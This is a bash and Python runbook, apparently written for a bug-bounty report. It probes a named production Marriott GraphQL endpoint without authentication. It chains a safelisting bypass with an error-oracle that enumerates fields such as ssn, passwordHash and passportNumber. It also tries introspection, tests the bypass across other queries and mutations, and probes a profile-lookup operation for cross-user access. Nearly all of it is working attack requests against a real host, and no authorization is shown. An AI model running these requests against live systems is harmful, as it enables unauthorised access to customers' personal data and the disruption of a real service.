#!/usr/bin/env bash
# Session 24 — M022 Chain Elevation Runbook
# Goal: Elevate safelisting bypass to High via schema enumeration + introspection + cross-op bypass
# Date: 2026-06-25
# Run on: Raspberry Pi 5 (zsh) — all heredocs use single-quoted 'PYEOF' to prevent history expansion

set -euo pipefail
mkdir -p /tmp/s24

ENDPOINT='https://auth-apc.marriott.com/mi/query/phoenixAccountGetMemberStatusDetails'
MY_CUST_ID='580EF43FAD482F46B04E29FE433CC4828.U1'

echo "========================================================"
echo "SESSION 24 — M022 CHAIN ELEVATION"
echo "Target: $ENDPOINT"
echo "Bypass: declare \$startYear but do NOT use it in body"
echo "NOTE: All tests are UNAUTHENTICATED (no cookies needed)"
echo "      — bypass passes safelisting at the gateway layer"
echo "========================================================"

# ---------------------------------------------------------------
# CHAIN 1: Error-based schema field enumeration (no auth needed)
#
# Oracle principle:
#   Field EXISTS   → upstream rejects with 1012100 or returns data
#   Field MISSING  → GraphQL engine rejects with "Cannot query field X on type Y"
#
# This lets us enumerate every field on Customer, CustomerProfile,
# ContactInformation, LoyaltyInformation without introspection or auth.
# ---------------------------------------------------------------

echo ""
echo "======== CHAIN 1: Schema field enumeration oracle ========"
echo ""

echo "--- 1a: Calibrate oracle — KNOWN-INVALID field (expect: 'Cannot query field') ---"
python3 << 'PYEOF'
import json
json.dump({
  "operationName": "phoenixAccountGetMemberStatusDetails",
  "variables": {"customerId": "580EF43FAD482F46B04E29FE433CC4828.U1", "startYear": 2026},
  "query": "query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) { customer(id: $customerId) { profile { NONEXISTENT_FIELD_XYZ } } }"
}, open("/tmp/s24/enum-calibrate.json","w"))
PYEOF
curl -s "$ENDPOINT" \
  -H 'content-type: application/json' \
  -H 'application-name: account' \
  -d @/tmp/s24/enum-calibrate.json \
  -w '\nHTTP %{http_code} | %{size_download}B\n' | tee /tmp/s24/enum-calibrate-out.txt
echo "EXPECTED: 'Cannot query field \"NONEXISTENT_FIELD_XYZ\" on type ...'"

echo ""
echo "--- 1b: Calibrate oracle — KNOWN-VALID field givenName (expect: 1012100 UNAUTHORIZED) ---"
python3 << 'PYEOF'
import json
json.dump({
  "operationName": "phoenixAccountGetMemberStatusDetails",
  "variables": {"customerId": "580EF43FAD482F46B04E29FE433CC4828.U1", "startYear": 2026},
  "query": "query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) { customer(id: $customerId) { profile { name { givenName } } } }"
}, open("/tmp/s24/enum-known-valid.json","w"))
PYEOF
curl -s "$ENDPOINT" \
  -H 'content-type: application/json' \
  -H 'application-name: account' \
  -d @/tmp/s24/enum-known-valid.json \
  -w '\nHTTP %{http_code} | %{size_download}B\n' | tee /tmp/s24/enum-known-valid-out.txt
echo "EXPECTED: 1012100 UNAUTHORIZED (proves 'givenName' field exists)"

echo ""
echo "--- 1c: Probe sensitive/unexpected field names on Customer root type ---"
# Each probe tests ONE field — error message reveals existence
# We're looking for: PII beyond what's public, admin flags, internal IDs

python3 << 'PYEOF'
import subprocess, json, sys

endpoint = 'https://auth-apc.marriott.com/mi/query/phoenixAccountGetMemberStatusDetails'
cust_id  = '580EF43FAD482F46B04E29FE433CC4828.U1'

# Fields to probe on Customer root type (from graphql-wordlist + domain knowledge)
customer_fields = [
    "id", "externalId", "customerId", "membershipId",
    "status", "accountStatus", "accountType", "accountFlags",
    "linkedAccounts", "federatedAccounts", "ssoAccounts",
    "ssn", "taxId", "passportNumber", "nationalId",
    "internalNotes", "adminNotes", "fraudFlags", "riskScore",
    "passwordHash", "salt", "securityQuestion", "securityAnswer",
    "creditScore", "creditCards", "paymentMethods",
    "roles", "permissions", "adminRole", "employeeId",
    "createdAt", "updatedAt", "lastLogin", "lastPasswordChange",
    "deletedAt", "mergedIntoId", "duplicateOf",
]

results = {"exists": [], "missing": [], "other": []}

for field in customer_fields:
    payload = {
        "operationName": "phoenixAccountGetMemberStatusDetails",
        "variables": {"customerId": cust_id, "startYear": 2026},
        "query": f"query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) {{ customer(id: $customerId) {{ {field} }} }}"
    }
    with open("/tmp/s24/enum-probe.json","w") as f:
        json.dump(payload, f)

    r = subprocess.run(
        ["curl", "-s", endpoint, "-H", "content-type: application/json",
         "-H", "application-name: account", "-d", "@/tmp/s24/enum-probe.json"],
        capture_output=True, text=True
    )
    body = r.stdout

    if "Cannot query field" in body or "did you mean" in body.lower():
        results["missing"].append(field)
        status = "MISSING"
    elif "1012100" in body or "UNAUTHORIZED" in body or "Credentials invalid" in body:
        results["exists"].append(field)
        status = "EXISTS (1012100)"
    elif "GRAPHQL_VALIDATION_FAILED" in body:
        results["exists"].append(field)
        status = "EXISTS (validation)"
    else:
        results["other"].append((field, body[:100]))
        status = f"OTHER: {body[:80]}"
    print(f"  {field}: {status}")

print("\n=== SUMMARY ===")
print(f"EXISTS ({len(results['exists'])}): {results['exists']}")
print(f"MISSING ({len(results['missing'])}): {results['missing']}")
print(f"OTHER ({len(results['other'])}): {[x[0] for x in results['other']]}")

with open("/tmp/s24/enum-customer-results.json","w") as f:
    json.dump(results, f, indent=2)
PYEOF

echo ""
echo "--- 1d: Probe CustomerProfile subtype fields ---"
python3 << 'PYEOF'
import subprocess, json

endpoint = 'https://auth-apc.marriott.com/mi/query/phoenixAccountGetMemberStatusDetails'
cust_id  = '580EF43FAD482F46B04E29FE433CC4828.U1'

profile_fields = [
    "name", "localizedName", "birthday", "gender", "salutation",
    "nationality", "passportNumber", "passportExpiry", "passportCountry",
    "taxId", "ssn", "driverLicense",
    "preferredLanguage", "preferredCurrency", "preferredContactMethod",
    "accessibilityNeeds", "dietaryPreferences", "smokingPreference",
    "vipStatus", "vipCode", "tier", "tierCode",
    "internalFlags", "fraudFlag", "watchlistFlag", "blacklistFlag",
    "employeeProfile", "employeeId", "employeeDepartment",
    "createdDate", "modifiedDate", "activationDate", "deactivationDate",
    "mergedFrom", "mergedInto", "duplicateStatus",
]

results = {"exists": [], "missing": []}

for field in profile_fields:
    payload = {
        "operationName": "phoenixAccountGetMemberStatusDetails",
        "variables": {"customerId": cust_id, "startYear": 2026},
        "query": f"query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) {{ customer(id: $customerId) {{ profile {{ {field} }} }} }}"
    }
    with open("/tmp/s24/enum-probe.json","w") as f:
        json.dump(payload, f)

    r = subprocess.run(
        ["curl", "-s", endpoint, "-H", "content-type: application/json",
         "-H", "application-name: account", "-d", "@/tmp/s24/enum-probe.json"],
        capture_output=True, text=True
    )
    body = r.stdout

    if "Cannot query field" in body:
        results["missing"].append(field)
        status = "MISSING"
    elif "1012100" in body or "UNAUTHORIZED" in body:
        results["exists"].append(field)
        status = "EXISTS"
    elif "GRAPHQL_VALIDATION_FAILED" in body:
        results["exists"].append(field)
        status = "EXISTS (validation)"
    else:
        results["missing"].append(field)
        status = f"UNKNOWN: {body[:60]}"
    print(f"  profile.{field}: {status}")

print(f"\nProfile fields EXISTS: {results['exists']}")
with open("/tmp/s24/enum-profile-results.json","w") as f:
    json.dump(results, f, indent=2)
PYEOF

echo ""
echo "--- 1e: Probe ContactInformation subtype ---"
python3 << 'PYEOF'
import subprocess, json

endpoint = 'https://auth-apc.marriott.com/mi/query/phoenixAccountGetMemberStatusDetails'
cust_id  = '580EF43FAD482F46B04E29FE433CC4828.U1'

contact_fields = [
    "emails", "phones", "addresses",
    "primaryEmail", "alternateEmail", "recoveryEmail",
    "primaryPhone", "mobilePhone", "workPhone",
    "homeAddress", "billingAddress", "mailingAddress",
    "linkedSocialAccounts", "facebookId", "googleId", "appleId",
    "pushNotificationToken", "deviceIds",
]

results = {"exists": [], "missing": []}

for field in contact_fields:
    payload = {
        "operationName": "phoenixAccountGetMemberStatusDetails",
        "variables": {"customerId": cust_id, "startYear": 2026},
        "query": f"query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) {{ customer(id: $customerId) {{ contactInformation {{ {field} }} }} }}"
    }
    with open("/tmp/s24/enum-probe.json","w") as f:
        json.dump(payload, f)

    r = subprocess.run(
        ["curl", "-s", endpoint, "-H", "content-type: application/json",
         "-H", "application-name: account", "-d", "@/tmp/s24/enum-probe.json"],
        capture_output=True, text=True
    )
    body = r.stdout

    if "Cannot query field" in body:
        results["missing"].append(field)
        status = "MISSING"
    elif "1012100" in body or "UNAUTHORIZED" in body:
        results["exists"].append(field)
        status = "EXISTS"
    elif "GRAPHQL_VALIDATION_FAILED" in body:
        results["exists"].append(field)
        status = "EXISTS (validation)"
    else:
        results["missing"].append(field)
        status = f"UNKNOWN: {body[:60]}"
    print(f"  contactInformation.{field}: {status}")

print(f"\nContactInfo fields EXISTS: {results['exists']}")
with open("/tmp/s24/enum-contact-results.json","w") as f:
    json.dump(results, f, indent=2)
PYEOF


# ---------------------------------------------------------------
# CHAIN 2: Introspection bypass
#
# GraphQL introspection is typically disabled in production.
# The bypass lets us probe __schema and __type directly.
# If enabled: full schema dump (Critical escalation).
# If disabled: "introspection is disabled" message
# ---------------------------------------------------------------

echo ""
echo "======== CHAIN 2: Introspection bypass ========"
echo ""

echo "--- 2a: __schema query via bypass ---"
python3 << 'PYEOF'
import json
json.dump({
  "operationName": "phoenixAccountGetMemberStatusDetails",
  "variables": {"customerId": "580EF43FAD482F46B04E29FE433CC4828.U1", "startYear": 2026},
  "query": "query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) { __schema { types { name kind } } }"
}, open("/tmp/s24/introspect-schema.json","w"))
PYEOF
curl -s "$ENDPOINT" \
  -H 'content-type: application/json' \
  -H 'application-name: account' \
  -d @/tmp/s24/introspect-schema.json \
  -w '\nHTTP %{http_code} | %{size_download}B\n' | tee /tmp/s24/introspect-schema-out.txt
echo "CRITICAL IF: response contains '__Schema', '__Type', or type names"
echo "BLOCKED IF: 'introspection has been disabled' or 'not supported'"

echo ""
echo "--- 2b: __type query for Customer type ---"
python3 << 'PYEOF'
import json
json.dump({
  "operationName": "phoenixAccountGetMemberStatusDetails",
  "variables": {"customerId": "580EF43FAD482F46B04E29FE433CC4828.U1", "startYear": 2026},
  "query": "query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) { __type(name: \"Customer\") { name fields { name type { name kind ofType { name kind } } } } }"
}, open("/tmp/s24/introspect-type.json","w"))
PYEOF
curl -s "$ENDPOINT" \
  -H 'content-type: application/json' \
  -H 'application-name: account' \
  -d @/tmp/s24/introspect-type.json \
  -w '\nHTTP %{http_code} | %{size_download}B\n' | tee /tmp/s24/introspect-type-out.txt

echo ""
echo "--- 2c: __type for CustomerProfile ---"
python3 << 'PYEOF'
import json
json.dump({
  "operationName": "phoenixAccountGetMemberStatusDetails",
  "variables": {"customerId": "580EF43FAD482F46B04E29FE433CC4828.U1", "startYear": 2026},
  "query": "query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) { __type(name: \"CustomerProfile\") { name fields { name type { name kind ofType { name kind } } } } }"
}, open("/tmp/s24/introspect-profile.json","w"))
PYEOF
curl -s "$ENDPOINT" \
  -H 'content-type: application/json' \
  -H 'application-name: account' \
  -d @/tmp/s24/introspect-profile.json \
  -w '\nHTTP %{http_code} | %{size_download}B\n' | tee /tmp/s24/introspect-profile-out.txt


# ---------------------------------------------------------------
# CHAIN 3: Cross-operation bypass
#
# From graphql-chunk, we have 67 phoenixAccount* operations.
# The same bypass (declare $startYear but don't use it) may work
# on OTHER operations that share the same variable signature.
# Key targets: operations that access different resolver types
# (payment, orders, trips) — broader data exposure.
# ---------------------------------------------------------------

echo ""
echo "======== CHAIN 3: Cross-operation bypass ========"
echo ""

echo "--- 3a: Extract operation signatures from chunk file (Pi must have /tmp/s18/apc-chunks/) ---"
echo "Checking for chunk file..."
if [ -f "/tmp/s18/apc-chunks/graphql-chunk-793e1a2cf24c51e7.js" ]; then
    echo "Chunk found. Extracting operation names + variable signatures..."
    python3 << 'PYEOF'
import re, json

chunk_path = "/tmp/s18/apc-chunks/graphql-chunk-793e1a2cf24c51e7.js"
with open(chunk_path, "r", encoding="utf-8", errors="replace") as f:
    content = f.read()

# Find all operation definitions: query/mutation NAME($var: Type, ...) {
# Look for: "query phoenixAccount...($var1: Type1!, $var2: Type2) {"
op_pattern = re.compile(
    r'"(query|mutation)\s+(phoenixAccount\w+)\s*(\([^)]*\))\s*\{',
    re.DOTALL
)
matches = op_pattern.findall(content)

ops = {}
for (op_type, name, var_sig) in matches:
    ops[name] = {"type": op_type, "vars": var_sig.strip()}

print(f"Found {len(ops)} operations:")
for name, info in sorted(ops.items()):
    print(f"  [{info['type'].upper()}] {name}{info['vars']}")

with open("/tmp/s24/operations.json", "w") as f:
    json.dump(ops, f, indent=2)
print("\nSaved to /tmp/s24/operations.json")
PYEOF
else
    echo "CHUNK FILE NOT FOUND at /tmp/s18/apc-chunks/"
    echo "Download it first:"
    echo "  mkdir -p /tmp/s24/chunks"
    echo "  curl -s 'https://auth-apc.marriott.com/mi-assets/web-rel-26.6.1-5d80cc6-11089/_next/static/chunks/graphql-chunk-793e1a2cf24c51e7.js' -o /tmp/s24/chunks/graphql-chunk.js"
fi

echo ""
echo "--- 3b: Test bypass on single-variable operations ---"
# Operations with only $customerId: ID! are the simplest bypass target
# No $startYear means the bypass is just: correct var sig = $customerId: ID!

python3 << 'PYEOF'
import subprocess, json, os

endpoint_base = 'https://auth-apc.marriott.com/mi/query/'
cust_id = '580EF43FAD482F46B04E29FE433CC4828.U1'

# Known single-variable operations from S19 analysis
# These have sig: $customerId: ID! (no $startYear)
# Bypass: just use $customerId: ID! + arbitrary fields
single_var_ops = [
    "phoenixAccountGetPersonalInformation",
    "phoenixAccountGetProfileDetails",
    "phoenixAccountGetWalletPaymentInfo",
    "phoenixAccountGetOrdersByCustomerId",
    "phoenixAccountGetUpcomingTripsBasicInfo",
    "phoenixAccountLookupCustomerProfiles",
]

results = {}

for op_name in single_var_ops:
    # Try three different field probes
    payload = {
        "operationName": op_name,
        "variables": {"customerId": cust_id},
        "query": f"query {op_name}($customerId: ID!) {{ customer(id: $customerId) {{ profile {{ name {{ givenName }} }} }} }}"
    }
    with open("/tmp/s24/cross-op-probe.json","w") as f:
        json.dump(payload, f)

    r = subprocess.run(
        ["curl", "-s", f"{endpoint_base}{op_name}",
         "-H", "content-type: application/json",
         "-H", "application-name: account",
         "-d", "@/tmp/s24/cross-op-probe.json"],
        capture_output=True, text=True, timeout=15
    )
    body = r.stdout[:200]

    if "FORBIDDEN" in body or "signature mismatch" in body or "OPERATION_SIGNATURE" in body:
        status = "BLOCKED (sig check)"
    elif "GRAPHQL_VALIDATION_FAILED" in body or "1012100" in body or "UNAUTHORIZED" in body:
        status = "BYPASS WORKS"
    elif "Cannot query field" in body:
        status = "BYPASS WORKS (different schema)"
    else:
        status = f"UNKNOWN: {body[:80]}"

    results[op_name] = status
    print(f"  {op_name}: {status}")

with open("/tmp/s24/cross-op-results.json","w") as f:
    json.dump(results, f, indent=2)
PYEOF

echo ""
echo "--- 3c: Test bypass on mutation operations (if any bypass works) ---"
# Mutations that bypass safelisting = HIGH SEVERITY (write access)
python3 << 'PYEOF'
import subprocess, json

endpoint_base = 'https://auth-apc.marriott.com/mi/query/'
cust_id = '580EF43FAD482F46B04E29FE433CC4828.U1'

# Known mutation operations from S19 analysis
# NOTE: We do NOT send real mutations — we test if safelisting blocks them
# If bypass works, we document it but do NOT actually mutate data
mutation_ops = [
    "phoenixAccountUpdateCustomerConsents",
    "phoenixAccountRegisterPromotion",
]

print("IMPORTANT: Testing safelisting bypass on mutations — NOT executing real mutations")
print("We use a nonsense field selection to confirm bypass without triggering real writes")
print("")

for op_name in mutation_ops:
    # Use a clearly invalid field to confirm bypass without real mutation side effects
    # The invalid field selection means even if bypass works, no real mutation fires
    payload = {
        "operationName": op_name,
        "variables": {"customerId": cust_id},
        "query": f"mutation {op_name}($customerId: ID!) {{ customer(id: $customerId) {{ __typename }} }}"
    }
    with open("/tmp/s24/mut-test.json","w") as f:
        json.dump(payload, f)

    r = subprocess.run(
        ["curl", "-s", f"{endpoint_base}{op_name}",
         "-H", "content-type: application/json",
         "-H", "application-name: account",
         "-d", "@/tmp/s24/mut-test.json"],
        capture_output=True, text=True, timeout=15
    )
    body = r.stdout[:300]

    if "FORBIDDEN" in body or "signature mismatch" in body:
        status = "BLOCKED"
    elif "GRAPHQL_VALIDATION_FAILED" in body:
        status = "BYPASS WORKS — mutation safelisting bypassable"
    else:
        status = f"RESPONSE: {body[:100]}"

    print(f"  {op_name}: {status}")
PYEOF


# ---------------------------------------------------------------
# CHAIN 4: LookupCustomerProfiles operation — IDOR candidate
#
# "LookupCustomerProfiles" is a search operation that may take
# an email/name/phone instead of $customerId.
# If we can look up OTHER users by email, that's a confirmed
# cross-user data access (IDOR) finding.
# ---------------------------------------------------------------

echo ""
echo "======== CHAIN 4: LookupCustomerProfiles cross-user test ========"
echo ""

echo "--- 4a: Probe LookupCustomerProfiles variable signature ---"
# First figure out what variables it takes
python3 << 'PYEOF'
import json
# Try with just a query string (guessing it takes $query: String or $email: String)
json.dump({
  "operationName": "phoenixAccountLookupCustomerProfiles",
  "variables": {"query": "test"},
  "query": "query phoenixAccountLookupCustomerProfiles($query: String) { __typename }"
}, open("/tmp/s24/lookup-probe.json","w"))
PYEOF
curl -s 'https://auth-apc.marriott.com/mi/query/phoenixAccountLookupCustomerProfiles' \
  -H 'content-type: application/json' \
  -H 'application-name: account' \
  -d @/tmp/s24/lookup-probe.json \
  -w '\nHTTP %{http_code} | %{size_download}B\n' | tee /tmp/s24/lookup-probe-out.txt
echo "If FORBIDDEN: wrong variable sig — try with $customerId: ID!"
echo "If GRAPHQL_VALIDATION_FAILED: bypass worked — discover real schema"
echo "If SUCCESS: admin-level search operation — HIGH SEVERITY"

echo ""
echo "--- 4b: Extract LookupCustomerProfiles query body from chunk (if available) ---"
if [ -f "/tmp/s18/apc-chunks/graphql-chunk-793e1a2cf24c51e7.js" ]; then
python3 << 'PYEOF'
import re
with open("/tmp/s18/apc-chunks/graphql-chunk-793e1a2cf24c51e7.js","r", errors="replace") as f:
    content = f.read()

# Find LookupCustomerProfiles operation
idx = content.find("LookupCustomerProfiles")
if idx == -1:
    print("LookupCustomerProfiles not found in chunk")
else:
    # Get surrounding context (2000 chars before and after)
    start = max(0, idx - 200)
    end = min(len(content), idx + 2000)
    snippet = content[start:end]
    print("=== LookupCustomerProfiles context ===")
    print(snippet[:2000])
PYEOF
fi


# ---------------------------------------------------------------
# CHAIN 5: __typename breadth test
#
# __typename is always available (meta-field). Even without auth,
# sending a query that only asks for __typename reveals whether
# the bypass reaches the GraphQL execution layer AND what object
# types are present at each resolver path.
# This works as a schema DISCOVERY method even with 1012100 errors.
# ---------------------------------------------------------------

echo ""
echo "======== CHAIN 5: __typename resolver breadth mapping ========"
echo ""

python3 << 'PYEOF'
import subprocess, json

endpoint = 'https://auth-apc.marriott.com/mi/query/phoenixAccountGetMemberStatusDetails'
cust_id  = '580EF43FAD482F46B04E29FE433CC4828.U1'

# Test resolver paths that might exist at the top level beyond "customer"
top_level_fields = [
    "customer",
    "viewer",
    "me",
    "account",
    "member",
    "user",
    "session",
    "loyaltyMember",
    "bonvoyMember",
]

print("Testing top-level resolver fields via __typename (bypass mode)...")
print("Result: RESOLVES → type name | MISSING → 'Cannot query field'")
print("")

for field in top_level_fields:
    payload = {
        "operationName": "phoenixAccountGetMemberStatusDetails",
        "variables": {"customerId": cust_id, "startYear": 2026},
        "query": f"query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) {{ {field}(id: $customerId) {{ __typename }} }}"
    }
    with open("/tmp/s24/typename-probe.json","w") as f:
        json.dump(payload, f)

    r = subprocess.run(
        ["curl", "-s", endpoint, "-H", "content-type: application/json",
         "-H", "application-name: account", "-d", "@/tmp/s24/typename-probe.json"],
        capture_output=True, text=True, timeout=15
    )
    body = r.stdout

    if "Cannot query field" in body:
        print(f"  {field}: DOES NOT EXIST at root level")
    elif "__typename" in body and "data" in body:
        # Actually got __typename back - note what type it resolved to
        print(f"  {field}: RESOLVES → {body[:200]}")
    elif "1012100" in body or "UNAUTHORIZED" in body:
        print(f"  {field}: EXISTS (resolver reached, upstream rejected auth)")
    elif "GRAPHQL_VALIDATION_FAILED" in body:
        print(f"  {field}: SCHEMA ISSUE → {body[:100]}")
    else:
        print(f"  {field}: OTHER → {body[:100]}")
PYEOF

echo ""
echo "======== SESSION 24 COMPLETE ========"
echo ""
echo "Evidence saved in /tmp/s24/"
echo ""
echo "=== KEY FINDINGS TO LOOK FOR ==="
echo ""
echo "CRITICAL (immediately submit as new separate finding):"
echo "  - Introspection returns __schema types → 'GraphQL introspection bypass'"
echo "  - LookupCustomerProfiles returns other users' data → IDOR confirmed"
echo "  - Sensitive fields found (ssn, passportNumber, taxId, internalFlags)"
echo ""
echo "HIGH:"
echo "  - Cross-op bypass works on mutation operations"
echo "  - 5+ admin/internal fields confirmed to exist on Customer type"
echo "  - New top-level resolver discovered beyond 'customer'"
echo ""
echo "MEDIUM (strengthens M022 report):"
echo "  - Cross-op bypass works on additional query operations"
echo "  - Additional field names mapped via oracle"
echo ""
echo "Next steps:"
echo "  1. Paste /tmp/s24/*.json and /tmp/s24/*-out.txt output here"
echo "  2. Screenshot Pi terminal (evidence item #6 for M022)"
echo "  3. Take time to rewrite M022 report in first-person voice"
